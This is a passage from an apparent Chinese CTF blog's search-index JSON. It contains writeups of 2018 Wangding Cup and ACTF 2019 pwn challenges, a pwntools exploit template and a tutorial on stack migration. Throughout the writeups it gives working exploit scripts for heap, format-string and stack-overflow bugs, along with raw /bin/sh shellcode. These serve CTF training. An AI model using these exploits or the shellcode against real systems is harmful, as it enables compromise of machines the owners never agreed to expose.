badges 以及 GitHub commit message 的 Angular 规范等等。大约在 v0.3.0 发布前学习了 利用 GitHub Actions 进行持续部署，感觉开发流程确实有必要引入自动化。\n","date":"2020-06-27","permalink":"/posts/passwd/","section":"Posts","summary":"\u003cp\u003ePlatform for Attacking Swiftly \u0026amp; Smoothly With Defending\u003c/p\u003e","title":"pAssWD 开发记录"},{"content":"","date":"2020-05-04","permalink":"/tags/fsb/","section":"Tags","summary":"","title":"fsb"},{"content":"","date":"2020-05-04","permalink":"/tags/%E5%A0%86%E6%BC%8F%E6%B4%9E/","section":"Tags","summary":"","title":"堆漏洞"},{"content":"准备今年网鼎杯时复现的一些题。题目不是很全，因为有些题不太会。\nGUESS # 题目有三次猜 flag 机会，每次都会 fork 出子进程，并且开启了 canary。尝试运行可以发现读取的 flag 放在了栈上，因此我们需要栈地址来泄露 flag，而泄露栈地址需要先泄露 libc。\n首先我们可以覆盖 argv[0] 为 puts@got，借助 __stack_chk_fail 函数的报错来泄露 libc。输入任意字符串进入 strncmp，在此处下断点，通过 p \u0026amp;__libc_argv[0] 可得到 argv[0] 地址，然后查看栈得到我们输入的字符串所在地址，两个地址的距离就是我们需要栈溢出的长度，这个长度是 0x128。然后放上 puts@got 就能泄露 libc，接下来就能得到 _environ 地址。\n计算 _environ 地址到 flag 地址的距离就能得到 flag 真实地址，这个距离是 0x168，我们可以在第三次地址泄露中读到 flag。\ndef ssp(payload): sla(\u0026#39;flag\u0026#39;, \u0026#39;a\u0026#39;*0x128 + payload) ru(\u0026#39;detected ***:\u0026#39;) ssp(p64(elf.got[\u0026#39;puts\u0026#39;])) puts = uu64(r(6)) base,libc,system = leak_libc(\u0026#39;puts\u0026#39;,puts,libc) env = base + libc.sym[\u0026#39;_environ\u0026#39;] ssp(p64(env)) flag = uu64(r(6)) - 0x168 ssp(p64(flag)) blind # 本题存在 double free 但没有 show 功能，申请堆块时只能申请 0x68 大小的，这个大小我们喜闻乐见，因为申请到的实际堆块大小为 0x70，而我们一般伪造 chunk size 都是借助 0x7f 来构造。\n那么我们可以借助 double free 申请堆块到全局数组的位置，伪造的堆块可以在 0x602060-0x23 处找到，然后就可以在全局数组上方再伪造一个 0x100 大小的 chunk，从而绕过 0x68 的限制申请到 small chunk。这里我们将 ptr[0] 和 ptr[2] 写成 0x602060，将 ptr[4] 写成 0x602150，我们稍后会看到原因。\n需要注意的是 free 时会检查后两块的 chunk size 是否合法，因此我们同样需要伪造：下一个 chunk 的起始地址为 0x602050+0x100 = 0x602150，可以从这里开始伪造 2 个 0x21 的 chunk。这里就是通过 ptr[4] 来伪造的。\n然后我们释放 0x100 的伪造 chunk，这样在释放时即进入 unsorted bin，覆盖 ptr[0] 和 ptr[1] 为 main_arena+88。释放需要用到一个指向 0x602060 的指针，也就是我们之前在 ptr[0] 写入的指针。随后进行 partial overwrite，覆盖掉 ptr[0] 也就是 main_arena+88 的最低 1 字节为 \\x00，这时 ptr[0] 存放的就是 __malloc_hook-0x10 的地址，这一步是编辑 ptr[2] 处指针指向的内容实现的。\n此时再编辑 ptr[0] 指向的内容即可写 __malloc_hook 为后门函数。\nadd(0) add(1) free(0) free(1) free(0) fake = 0x602060 fake_next = 0x602150 add(2,p64(fake-0x23)) add(3) add(4) payload = flat(\u0026#39;a\u0026#39;*3,0,0x101,fake,0,fake,0,fake_next,0,0) add(5, payload) edit(4,flat(0,0x21,0,0,0,0x21)) free(0) # 0x100 edit(2,\u0026#39;\u0026#39;) # \\x00, malloc_hook-0x10 system = 0x4008e3 edit(0,\u0026#39;a\u0026#39;*0x10+p64(system)) sla(\u0026#39;:\u0026#39;,_add) sla(\u0026#39;:\u0026#39;,3) babyheap # 本题和上题有点类似，只能分配 0x20 的堆块，漏洞点相同，且多了 show 功能。\n首先考虑泄露 libc，我们采用传统的 unsorted bin 泄露大法，这就需要我们伪造 small chunk。为了伪造这个 chunk，首先要泄露堆地址，那么连续释放 2 个 fast chunk，后一个的 fd 就会指向前一个 chunk 的地址，从而可以泄露堆地址。唯一需要注意的是 show 在输出时用的 puts 遇到 \\x00 会截断，所以要注意释放顺序使得泄露出的地址中不存在 \\x00 字节。\n获得堆地址之后，在 chunk0 内伪造 chunk 头造成堆块重叠，然后申请两次就可以申请到一个 heap+0x20 处的 chunk，通过写这个 chunk 我们可以写 chunk1 的头部，使得其大小变成 0xa1。随后释放即可泄露 libc，但这里释放时会检查后两个 chunk 的 size，因此我们还需要绕过检查。\n绕过的方法是，不断申请 chunk 直到 0xa1 这个 chunk 的末尾，此时申请到的是 chunk4。写入 0,0x31 伪造一个 chunk 头；再申请一个 chunk5，写入 0x30,0x30 伪造 chunk 头，使得 chunk4 看起来是空闲的。这两步先做好后再释放 chunk1 才能通过检查。\n这里让 chunk4 空闲的目的就是为了触发 unlink 造成任意地址写，那么显然我们还需要再 chunk4 的内容里添加伪造的 fd 和 bk，即 0x602080-0x18 和 0x602080-0x10，这里 0x602080 是 ptr[4]。unlink 之后，我们成功令 ptr[4] 指向 ptr[1]。现在编辑 chunk4 即可修改 ptr[1] 为 free_hook，然后编辑 chunk1 即可覆盖 free_hook 为 one_gadget（system 同理）。\nadd(0) add(1) add(2) add(3) fd = 0x602080-0x18 bk = 0x602080-0x10 add(4,flat(0,0x31,fd,bk)) add(5,flat(0x30,0x30)) free(1) free(0) show(0) heap = uu64(r(4)) - 0x30 leak(\u0026#39;heap\u0026#39;,heap) edit(0,flat(heap+0x20,0,0,0x31)) add(6) # 0 add(7,flat(0,0xa1)) # above 1 free(1) show(1) base = uu64(r(6))-88-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 leak(\u0026#39;base\u0026#39;,base) free_hook = base + libc.sym[\u0026#39;__free_hook\u0026#39;] edit(4,p64(free_hook)) edit(1,p64(base+0x4526a)) free(2) easyfmt # 常规的 32 位格式化字符串题，自动化测得偏移为 6，然后泄露 libc，覆盖 printf@got 为 system。\nru(\u0026#39;?\\n\u0026#39;) def exec_fmt(payload): sl(payload) info = r() return info auto = FmtStr(exec_fmt) sl(p32(elf.got[\u0026#39;printf\u0026#39;]) + \u0026#39;%6$s\u0026#39;) r(4) printf = u32(r(4)) leak(\u0026#39;printf\u0026#39;,printf) base,libc,system = leak_libc(\u0026#39;printf\u0026#39;,printf) sl(fmtstr_payload(auto.offset, {elf.got[\u0026#39;printf\u0026#39;]:system})) sl(\u0026#39;/bin/sh\\x00\u0026#39;) fgo # 入门级堆题，直接 uaf 即可。解法可以参考 hitcontraining_hacknote。\nadd(0x20) add(0x20) free(0) free(1) add(0x8,p32(elf.sym[\u0026#39;secret\u0026#39;])) show(0) soEasy # 存在栈溢出，给出了栈地址，checksec 发现 NX 关闭，因此直接写好 shellcode 然后返回到 shellcode 地址即可。\nru(\u0026#39;0x\u0026#39;) buf = int(ru(\u0026#39;\\n\u0026#39;),16) payload = asm(shellcraft.sh()).ljust(0x4c,\u0026#39;a\u0026#39;) + p32(buf) sla(\u0026#39;?\u0026#39;,payload) pesp # 编辑时新的 size 并没有作检查，导致可以堆溢出。利用堆溢出修改空闲 fast chunk 的 fd，手动造成 uaf，借助假的 0x7f 伪造 chunk 分配到 itemlist 上方从而修改 itemlist 中的内容指针达到任意地址写，泄露 libc 后覆盖 atoi 为 system。\nfake = 0x6020ad add(0x60) add(0x60) free(1) edit(0,0x100,flat(\u0026#39;a\u0026#39;*0x60,0,0x71,fake)) add(0x60) # 1 add(0x60, flat(\u0026#39;a\u0026#39;*3, 0x100, elf.got[\u0026#39;atoi\u0026#39;])) show() ru(\u0026#39;:\u0026#39;) atoi = uu64(r(6)) base,libc,system = leak_libc(\u0026#39;atoi\u0026#39;,atoi,libc) edit(0,0x8,p64(system)) sla(\u0026#39;:\u0026#39;, \u0026#39;/bin/sh\\x00\u0026#39;) semifinal_pwn1 # 本题功能比较复杂，关键在于自己可以添加自己为好友，然后删除自己时就可以释放内存。而每个用户都会分配一块 0x130 的 chunk，释放后进入 unsorted bin。随后就可以利用 uaf 泄露 libc 并借助 update 功能覆盖 got 表。\ndef reg(size,name): sla(\u0026#39;choice:\u0026#39;,2) sla(\u0026#39;:\u0026#39;,size) sla(\u0026#39;:\u0026#39;,name) sla(\u0026#39;:\u0026#39;,20) sla(\u0026#39;:\u0026#39;,\u0026#39;desc\u0026#39;) def login(name): sla(\u0026#39;choice:\u0026#39;,1) sla(\u0026#39;:\u0026#39;,name) def logout(): sla(\u0026#39;choice:\u0026#39;,6) def add_free(name,choice): sla(\u0026#39;choice:\u0026#39;,3) sla(\u0026#39;:\u0026#39;,name) sla(\u0026#39;(a/d)\u0026#39;, choice) def view_profile(): sla(\u0026#39;choice:\u0026#39;,1) def edit(name): sla(\u0026#39;choice:\u0026#39;,2) sa(\u0026#39;:\u0026#39;, name) sla(\u0026#39;:\u0026#39;,20) sla(\u0026#39;:\u0026#39;,\u0026#39;desc\u0026#39;) reg(8,\u0026#39;a\u0026#39;*6) reg(8,\u0026#39;b\u0026#39;*6) login(\u0026#39;b\u0026#39;*6) add_free(\u0026#39;b\u0026#39;*6,\u0026#39;a\u0026#39;) add_free(\u0026#39;b\u0026#39;*6,\u0026#39;d\u0026#39;) view_profile() ru(\u0026#39;Age:\u0026#39;) base = int(ru(\u0026#39;\\n\u0026#39;),16)-88-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 leak(\u0026#39;base\u0026#39;,base) puts = base + libc.sym[\u0026#39;puts\u0026#39;] logout() reg(0x20, p64(elf.got[\u0026#39;puts\u0026#39;])) login(p64(puts)) edit(p64(base+0x4526a)[:-2]) semifinal_pwn2 # 这题比较有意思，程序是一个 brainfuck 解释器，规则是：\n\u0026lt;： p-- \u0026gt;： p++ .： putc(*p) ,： read(0,p,1) +： *p++ -： *p-- 换句话说已经可以构造任意地址读写了，那么首先利用上述规则泄露 stdin 来泄露 libc，然后用 one_gadget 覆盖 got 表。\nstdin = 0x602090 star = 0x6020c0 exit = elf.got[\u0026#39;exit\u0026#39;] payload = \u0026#39;\u0026lt;\u0026#39;*(star-stdin) + \u0026#39;.\u0026gt;.\u0026gt;.\u0026gt;.\u0026gt;.\u0026gt;.\u0026gt;\u0026#39; payload += \u0026#39;\u0026lt;\u0026#39;*(stdin+6-exit) + \u0026#39;,\u0026gt;,\u0026gt;,\u0026gt;,\u0026gt;,\u0026gt;,\u0026#39; sla(\u0026#39;:\u0026#39;,payload) stdin = uu64(r(6)) base = stdin - libc.sym[\u0026#39;_IO_2_1_stdin_\u0026#39;] leak(\u0026#39;base\u0026#39;,base) one = p64(base + 0xf1147) for i in range(6): s(one[i]) semifinal_pwn3 # 本题当输入选项为 1337 时会调用一个奇怪的函数，但实际上由于 uaf 漏洞的存在这个函数并没有什么用。还有一个比较少见的 clean 功能用于清除所有指针，这里是不存在 uaf 的。\n我们可以直接 unsorted bin 泄露 libc（这里是通过 clean 功能清楚指针，重新申请到释放的 small chunk 后泄露 bk），然后 double free 写 malloc_hook，最后故意 double free 触发 malloc_print_err，调用 malloc_hook。\ndef clean(): sla(\u0026#39;choice :\u0026#39;, 4) add(0x80) add(0x60) add(0x60) free(0) clean() add(0x80) show() ru(\u0026#39;a\u0026#39;*8) base = uu64(r(6))-88-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 leak(\u0026#39;base\u0026#39;,base) malloc_hook = base + libc.sym[\u0026#39;__malloc_hook\u0026#39;] one = base + 0xf02a4 free(1) free(2) free(1) add(0x60,p64(malloc_hook-0x23)) add(0x60) add(0x60) add(0x60,\u0026#39;a\u0026#39;*0x13 + p64(one)) free(0) free(0) # malloc_print_err ","date":"2020-05-04","permalink":"/posts/wdb2018-pwn/","section":"Posts","summary":"\u003cp\u003e准备今年网鼎杯时复现的一些题。题目不是很全，因为有些题不太会。\u003c/p\u003e","title":"网鼎杯 2018 Pwn"},{"content":"其中从 # start 到 # end 中间的部分为核心代码。最近更新的博客中 Pwn 题脚本的代码仅包含核心代码。\n依赖 # 必需 pwntools gdb Python 2 / 3 Ubuntu 16.x / 18.x / 19.x 非必需（可将对应功能注释掉） LibcSearcher one_gadget patchelf glibc-all-in-one 说明 # leak_libc 函数可以选择使用指定 ELF 文件或是利用 LibcSearcher 搜寻 libc 使用不同于系统版本的 libc 时，需要用到 patchelf 工具 增删改查功能的序号以及发送内容的逻辑，请根据具体题目修改 主要代码放在 # start 和 # end 之间 远程运行时必须指定 -p 选项 其它功能请运行 python exp.py -h 查询 代码 # from pwn import * from LibcSearcher import LibcSearcher from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter s = lambda data: p.send(str(data)) sa = lambda delim,data: p.sendafter(delim,str(data)) sl = lambda data: p.sendline(str(data)) sla = lambda delim,data: p.sendlineafter(delim,str(data)) r = lambda num=4096: p.recv(num) ru = lambda delims,drop=True: p.recvuntil(delims,drop) uu64 = lambda data: u64(data.ljust(8,\u0026#39;\\0\u0026#39;)) leak = lambda name,addr: log.success(\u0026#39;{} = {:#x}\u0026#39;.format(name, addr)) def leak_libc(func,addr,elf=None): if elf: libc = elf base = addr-libc.sym[func] leak(\u0026#39;base\u0026#39;,base) system = base+libc.sym[\u0026#39;system\u0026#39;] else: libc = LibcSearcher(func,addr) base = addr-libc.dump(func) leak(\u0026#39;base\u0026#39;,base) system = base+libc.dump(\u0026#39;system\u0026#39;) return (base,libc,system) parser = ArgumentParser(formatter_class=ArgumentDefaultsHelpFormatter) parser.add_argument(\u0026#39;-b\u0026#39;,help=\u0026#39;binary file\u0026#39;,required=True,metavar=\u0026#39;BINARY\u0026#39;) parser.add_argument(\u0026#39;-r\u0026#39;,help=\u0026#39;remote host\u0026#39;,default=\u0026#39;node3.buuoj.cn\u0026#39;,metavar=\u0026#39;RHOST\u0026#39;) parser.add_argument(\u0026#39;-p\u0026#39;,type=int,help=\u0026#39;remote port\u0026#39;,metavar=\u0026#39;RPORT\u0026#39;) parser.add_argument(\u0026#39;-l\u0026#39;,help=\u0026#39;libc - [xx] for v2.xx, or [/path/to/libc.so.6] to load a specific libc\u0026#39;,default=\u0026#39;23\u0026#39;,metavar=\u0026#39;LIBC\u0026#39;) parser.add_argument(\u0026#39;-d\u0026#39;,help=\u0026#39;disable DEBUG mode\u0026#39;,action=\u0026#39;store_true\u0026#39;) args = parser.parse_args() print(args) binary = args.b context.binary = binary elf = ELF(binary,checksec=False) if not args.d: context.log_level = \u0026#39;DEBUG\u0026#39; path_dict = { \u0026#39;23\u0026#39;: \u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;, \u0026#39;27\u0026#39;: \u0026#39;./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so\u0026#39;, \u0026#39;29\u0026#39;: \u0026#39;./glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so\u0026#39; } libc_path = path_dict.get(args.l, args.l) libc = ELF(libc_path,checksec=False) if args.p: p = remote(args.r, args.p) else: p = process(binary,env={\u0026#39;LD_PRELOAD\u0026#39;:libc_path}) def dbg(): gdb.attach(p) pause() _add,_free,_edit,_show = 1,4,2,3 def add(index,content=\u0026#39;a\u0026#39;*8): sla(\u0026#39;:\u0026#39;,_add) sla(\u0026#39;:\u0026#39;,index) sa(\u0026#39;:\u0026#39;,content) def free(index): sla(\u0026#39;:\u0026#39;,_free) sla(\u0026#39;:\u0026#39;,index) def edit(index,content): sla(\u0026#39;:\u0026#39;,_edit) sla(\u0026#39;:\u0026#39;,index) sa(\u0026#39;:\u0026#39;,content) def show(index): sla(\u0026#39;:\u0026#39;,_show) sla(\u0026#39;:\u0026#39;,index) # start # end p.interactive() ","date":"2020-04-26","permalink":"/posts/pwn-template/","section":"Posts","summary":"\u003cp\u003e其中从 \u003ccode\u003e# start\u003c/code\u003e 到 \u003ccode\u003e# end\u003c/code\u003e 中间的部分为核心代码。最近更新的博客中 Pwn 题脚本的代码仅包含核心代码。\u003c/p\u003e","title":"Pwn 脚本模板"},{"content":"","date":"2020-04-26","permalink":"/tags/%E6%A8%A1%E7%89%88/","section":"Tags","summary":"","title":"模版"},{"content":"基本告别开发了。\n又一年双创，不知道为什么又报了，现在想来后悔不已，但也不是全无收获。\n技术 # 技术上，经过一天钢铁这类商业项目的锻炼，Quasar+Webpack+Vue 全家桶已经用得比较熟了，SwingMood 开发过程中更多是因为要适配移动端，进一步加深了对 flexbox 的理解。\n比较有意思的是在项目进行时我同时也在实习，进行一些渗透测试的工作。渗透过程中，甲方开发用了一种很蠢的方式进行会话管理：使用 IP 标识一个账户。这对于攻击者来说简直是天大的福音，因此我们不禁去质询开发为什么要这样做，得到了如下回答：\n前端采用了 axios 发起异步请求，后端本来采用 session 进行会话管理，这需要前端发起请求时带上 Cookie。但当设置 withCredential 为 true 时，后端必须设置 Access-Control-Allow-Credentials 头；这时，Access-Control-Allow-Origin 头必须是一个指定的源，不能为 *。于是我们只能取消了 session 机制。\n然而正确的做法是指定 Access-Control-Allow-Origin 头为一个或一组特定的源，例如 http://localhost:8080 等。实际生产环境中，可以指定为前端页面所在的源，这也是我们给出的修复建议。实际上，在 SwingMood 开发过程中我就遇到了完全相同的问题，前端开发经验总算派上了点用场。\n剩下的是一些技术上的小进步：\n处理跨域问题时，最方便的方法是直接使用 webpack 的开发服务器代理，将 changeOrigin 设置为 true axios 中对后端返回数据的处理，比较方便的方法是添加拦截器对 res.data.code 进行检查 深入学习并理解了 Vue 生命周期钩子的调用顺序 对于需要登录才可以访问的页面，最方便的处理方法是利用 VuerRouter 的 beforeEach 方法，检查页面的自定义属性 为了解决页面刷新丢失 session 的问题，可以监听 beforeunload 方法将 Vuex 的 state 存入 sessionStorage，并在页面加载时取出。 由此可以看出我的 Vue 技术还有待提高，对底层原理的理解尚不到位。\n管理 # 在这次项目过程中我作为组长，需要协调好各队员间的工作。对于这类任务我并没有什么经验，因此这次做得不是特别好，导致项目进度耽误了一些。\n下面关于项目流程的一些记录，以反映翻车的具体原因：\n项目初期，我按各人意愿分配了任务 心理同学 * 2：阅读文献、提供理论支撑 熟悉前端的同学 A：写后端（？） 熟悉后端的同学 B：写前端（？） 我完成了 app 整体界面框架，用时 3 天 A 提出想采用 protobuf + grpc 构建后端，由于项目本来就是为了学习新知识，我同意了 给 B 安排前端学习计划 和 A 一起调试奇怪的 Golang 专属问题 中间大约 2 个月的时间啥也没干 快答辩了，和心理的同学明确需求，修改前端界面，催后端 终于发现💊，互换 A/B 工作 后端变回 Spring 了，为了加速 B 的进度我甚至写了不少 Java 代码（？） 后端开发基本完成，大概用时 1 周多一点（？） 让心理同学收集素材，继续完善前后端 开发完成，打包遇到问题，又调试 3 天 搞定，写报告，提交 所以说作为管理者我是要背很大的锅的。。回顾整个项目流程，我感到十分迷惑。我觉得今后在进行任务分配时，应做到：\n合理分配，即尽量根据队员所擅长的方面来分配对应的任务 设定严格的交付时间，以防止出现拖延的情况 对于需求中不明确的地方，应及时沟通，并尽可能做到在软件需求上明确无歧义 ","date":"2020-04-11","permalink":"/posts/swingmood/","section":"Posts","summary":"\u003cp\u003e基本告别开发了。\u003c/p\u003e","title":"SwingMood 项目实践心得"},{"content":"参考 CTF-Wiki 画的一些图。\n在栈溢出空间较小时，我们无法在栈上放下 ROP 链，这时往往会考虑将栈转移到其它可执行的地方（如 bss 段 / data 段），这种技术称为栈迁移。栈迁移一般可以分为 stack pivoting 和 frame faking，前者主要关注 esp（我们以 32 位为例，64 位同理），而后者关注 ebp 和 esp。\nstack pivoting # 这种方法比较简单，因为只改变 esp，因此利用条件也比较严格。这种方法适用于栈上可以执行 shellcode，但无法泄露 shellcode 地址的情况。\n假设现在 NX 关闭，我们首先将 shellcode 输入到字符数组里，这里假设 shellcode 的长度大于溢出长度，而小于字符数组长度加溢出长度。\n然后，我们需要一些能够控制 esp 的 gadgets，例如 pop esp/add esp,??/sub esp,?? 等等。我们还需要 jmp esp 这个 gadget。接下来布置栈：\n| sub esp,0x??; jmp esp | ----------------------- | jmp esp | ----------------------- | saved ebp | \u0026lt;- ebp ----------------------- | padding | ----------------------- | shellcode | \u0026lt;- esp ----------------------- 注意这里的 shellcode 是可以覆盖掉 saved ebp 的，我们并不关心它的值，当然此时也就不需要 padding 了。\n现在我们没有 shellcode 地址，但是我们知道栈上的偏移是固定的。因此我们接下来要做的就是让 esp 指向 shellcode 然后 jmp 过去，就可以执行 shellcode 了。sub esp,0x?? 的偏移量可以根据 payload 计算得到。\n容易产生疑惑的是这里又用一个 jmp esp 覆盖了返回地址。我们来看一下函数返回时会发生什么：\n----------------------- | | \u0026lt;- ebp | | | | | ... | ----------------------- | sub esp,0x??; jmp esp | ----------------------- | jmp esp | \u0026lt;- esp ----------------------- | saved ebp | ----------------------- | padding | ----------------------- | shellcode | ----------------------- 首先会弹出局部变量、saved ebp 等。此时 ebp 恢复到上个栈帧基址。\n接下来要弹出返回地址并设置 eip 为返回地址，此时有：\n| sub esp,0x??; jmp esp | \u0026lt;- esp ----------------------- | jmp esp | ----------------------- | saved ebp | ----------------------- | padding | ----------------------- | shellcode | ----------------------- 此时才会执行 jmp esp，那么程序控制流就跳转到了 sub esp,0x??; jmp esp 这条语句的地址上，从而执行该语句，这样 esp 就指向了 shellcode 并执行了。\nframe faking # 这种方法更常见，利用难度也高于上面那种，但是不需要关闭 NX，可直接构造 ROP 链。\n假设一个比较经典的情况，也就是 ret2libc：我们将 ROP 链拆分成 2 段，其中第一段泄露 libc，第二段执行 system(\u0026quot;/bin/sh\u0026quot;)。这两段我们分别称之为 target1 和 target2。首先，我们需要程序有一个存在栈溢出漏洞的读入操作，我们输入构造好的内容使得栈如图所示：\n| 0x100 | ----------- | fake ebp1 | ----------- | 0 | ----------- | leave_ret | ----------- | read | ----------- | fake ebp1 | \u0026lt;- ebp ----------- | | | padding | | | \u0026lt;- esp ----------- 这里的 read 函数及 leave_ret 上方的三个参数不是必需的，只要有办法向 fake ebp1 位置写入内容即可，而这个位置由我们自己选定（通常在 bss 段 / data 段）。换句话说，我们最少只需要两个单元（32 位 8 字节，64 位 16 字节）的栈溢出，或者说只需要能覆盖到返回地址，就可以实现迁移。\n那么 leave_ret 是什么呢？这条汇编语句等价于：\nmov esp, ebp pop ebp 并且，该语句在函数返回时本身就会执行。当我们将它填在返回地址后，这条语句就会被执行 2 次。\n第一次执行 # 先看 leave：\nmov esp, ebp 将 esp 指向 ebp 指向的位置：\n| 0x100 | ----------- | fake ebp1 | ----------- | 0 | ----------- | leave_ret | ----------- | read@plt | ----------- | fake ebp1 | \u0026lt;- ebp \u0026lt;- esp ----------- pop ebp 弹出 fake ebp1，赋值给 ebp：\n| 0x100 | ----------- | fake ebp1 | ----------- | 0 | ----------- | leave_ret | ----------- | read@plt | \u0026lt;- esp ----------- | fake ebp1 | fake ebp1 -\u0026gt; | ... | \u0026lt;- ebp ----------- ----- 然后 ret，执行 read 函数后返回到下一个 leave_ret 继续执行。这里我们通过 read 可以向 fake ebp1 位置写入 target1：\n| 0x100 | ---------------- | fake ebp2 | ---------------- | 0 | ---------------- | leave_ret | ---------------- | read@plt | ---------------- | puts@got | ---------------- | pop ebx; ret | ---------------- | puts@plt | ---------------- fake ebp1 -\u0026gt; | fake ebp2 | \u0026lt;- ebp ---------------- 这里的 read 与 leave_ret 和我们第一次构造的原理类似，fake ebp2 与 fake ebp1 类似。我们稍后就能看到为什么需要先填一个 fake ebp2。\n至此，我们为第一次栈迁移作好了准备。\n第二次执行 # 先看 leave：\nmov esp, ebp 将 esp 指向 ebp 指向的位置，即 fake ebp1：\n| 0x100 | ---------------- | fake ebp2 | ---------------- | 0 | ---------------- | leave_ret | ---------------- | read@plt | ---------------- | puts@got | ---------------- | pop ebx; ret | ---------------- | puts@plt | ---------------- fake ebp1 -\u0026gt; | fake ebp2 | \u0026lt;- ebp \u0026lt;- esp ---------------- pop ebp 弹出 fake ebp2，赋值给 ebp：\n| 0x100 | ---------------- | fake ebp2 | ---------------- | 0 | ---------------- | leave_ret | ---------------- | read@plt | ---------------- | puts@got | ---------------- | pop ebx; ret | ---------------- | puts@plt | \u0026lt;- esp ---------------- fake ebp1 -\u0026gt; | fake ebp2 | fake ebp2 -\u0026gt; | ... | \u0026lt;- ebp ---------------- ----- 至此我们已经完成了第一次栈迁移。\n然后 ret 执行 target1，泄露 libc。接着执行 read 后再次返回到 leave_ret。这里我们通过 read 可以向 fake ebp2 位置写入 target2：\n| addr of /bin/sh | ----------------- | 0xdeadbeef | ----------------- | system@plt | ----------------- fake ebp2 -\u0026gt; | 0xdeadbeef | \u0026lt;- ebp ----------------- 这样就为第二次栈迁移作好了准备。接下来第二次栈迁移的过程就和第一次相同了。因为我们这里只演示两次迁移，因此原本应该填 fake ebp3 的地方填成了 0xdeadbeef，实际上依然可以填一个有效的可写地址继续进行第三次栈迁移。\n总结 # 可以看到，栈迁移的根本目标是改变 esp，只不过 stack pivoting 用 gadgets 直接更改，而 frame faking 通过修改 rbp，借助 leave_ret 来修改 rsp，达到类似伪造栈帧的效果。\n","date":"2020-03-04","permalink":"/posts/stack-migration/","section":"Posts","summary":"\u003cp\u003e参考 \u003ca href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/\"   target=\"_blank\"\u003eCTF-Wiki\u003c/a\u003e 画的一些图。\u003c/p\u003e","title":"狡兔三窟：栈迁移可视化的尝试"},{"content":"难题都没有做出来。题目来自 ACTF 2019、GYCTF 2019、VNCTF 2020。\nACTF 2019 # babystack # 只能溢出 0x10 字节，因此使用栈迁移。这题的迁移比较简单，题目给了栈地址，并且只需要迁移一次。\nleave = 0x400a18 pop_rdi = 0x400ad3 sla(\u0026#39;?\\n\u0026#39;,str(0xe0)) ru(\u0026#39;saved at 0x\u0026#39;) addr = int(ru(\u0026#39;\\n\u0026#39;),16) # ebp2,payload,padding,fake ebp,leave_ret payload = flat(\u0026#39;a\u0026#39;*8,pop_rdi,elf.got[\u0026#39;puts\u0026#39;],elf.plt[\u0026#39;puts\u0026#39;],0x4008f6).ljust(0xd0,\u0026#39;a\u0026#39;) + flat(addr,leave) sa(\u0026#39;?\\n\u0026#39;,payload) ru(\u0026#39;~\\n\u0026#39;) puts = uu64(r(6)) system,binsh = ret2libc(puts,\u0026#39;puts\u0026#39;) sla(\u0026#39;?\\n\u0026#39;,str(0xe0)) ru(\u0026#39;saved at 0x\u0026#39;) addr = int(ru(\u0026#39;\\n\u0026#39;),16) payload = flat(\u0026#39;a\u0026#39;*8,pop_rdi,binsh,system).ljust(0xd0,\u0026#39;a\u0026#39;) + flat(addr,leave) sa(\u0026#39;?\\n\u0026#39;,payload) 一个复读机 # 很容易发现格式化字符串漏洞，首先测出偏移为 7 处是返回地址，我们往这里写地址即可。写什么地址呢？程序没有开启 NX 保护，因此可以先布置 shellcode，然后写 shellcode 地址。\n但是我们只能在栈上布置 shellcode，而栈地址以 0xff 开头，如果直接写入 4 字节地址，那么需要输出非常长的字符串才行，非常耗时。因此我们尝试分 2 次写入，每次 2 字节。\n从 这里 盗取了一张不错的图示：\nTo illustrate why we write payload in that way This is an example stack layout, supposing the leak address is 0xffffc970 *---------------* c930 | 0xffffc970 | (addr of format string) *---------------* c934 | xxxxxxxxxx | 1$ (first parameter of printf) *---------------* ..... *---------------* c94c | return addr | 7$ *---------------* ..... *---------------* c970 | 0xffffc94c | 16$ (start addr of read buffer) *---------------* c974 | \u0026#34;%516\u0026#34; | 17$ (51628 = 0xc9b0 - 4) *---------------* c978 | \u0026#34;28d%\u0026#34; | 18$ *---------------* c97c | \u0026#34;16$h\u0026#34; | 19$ *---------------* c980 | \u0026#34;naaa\u0026#34; | 20$ *---------------* c984 | 0xffffc94e | 21$ *---------------* c988 | \u0026#34;%138\u0026#34; | 22$ (13869 = 0xffff - 0xc9b0 - 4 - 3) *---------------* c98c | \u0026#34;69d%\u0026#34; | 23$ *---------------* c990 | \u0026#34;21$h\u0026#34; | 24$ *---------------* c994 | \u0026#34;naaa\u0026#34; | 25$ *---------------* c998 | \u0026#34;aaaa\u0026#34; | 26$ *---------------* ..... *---------------* c9b0 | | | shellcode | | | *---------------* 首先要写的目标是 0xffffc94c 也就是返回地址所在位置，向这个位置先写入 0xc9b0 也就是后面我们计算出的 shellcode 地址的低 4 位，这里 -4 是因为前面已经输出 0xffffc94c 这 4 字节了。因此第一步 payload 为 %51628d%16$hnaaa，最后 aaa 是为了凑到 4 字节对齐，hn 是以 2 字节写入，16 的偏移可以自动化测出。\n同理，第二步要写入的目标是 0xffffc94e，写入数据是 shellcode 高 4 位减去低 4 位 0xffff-0xc9b0，随后 -4 是因为前面已经输出 0xffffc94e 这 4 字节，-3 是因为第一步填充的 aaa 占 3 字节。第二步 payload 即 %13869d%21$hnaaa。\n两步的 payload 合并后长为 0x28 字节，在后面放上 shellcode，此时即确定了 shellcode 的地址。触发漏洞就能 getshell 了。\nshellcode = \u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; sla(\u0026#39;Exit\\n\u0026#39;,\u0026#39;1\u0026#39;) buf = int(r(8),16) sc = buf+0x28 ret = buf-0x24 payload = p32(ret)+\u0026#39;%\u0026#39;+str((sc\u0026amp;0xffff)-4)+\u0026#39;d%16$hnaaa\u0026#39; payload += p32(ret+2)+\u0026#39;%\u0026#39;+str(((sc\u0026gt;\u0026gt;16)\u0026amp;0xffff)-(sc\u0026amp;0xffff)-7)+\u0026#39;d%21$hnaaa\u0026#39; payload += shellcode s(payload) sla(\u0026#39;Exit\\n\u0026#39;,\u0026#39;2\u0026#39;) another_repeater # 题目在输入长度时可以整数溢出，还给了 buf 的地址。那么直接输入 -1，然后 ret2shellcode 即可。\nshellcode = 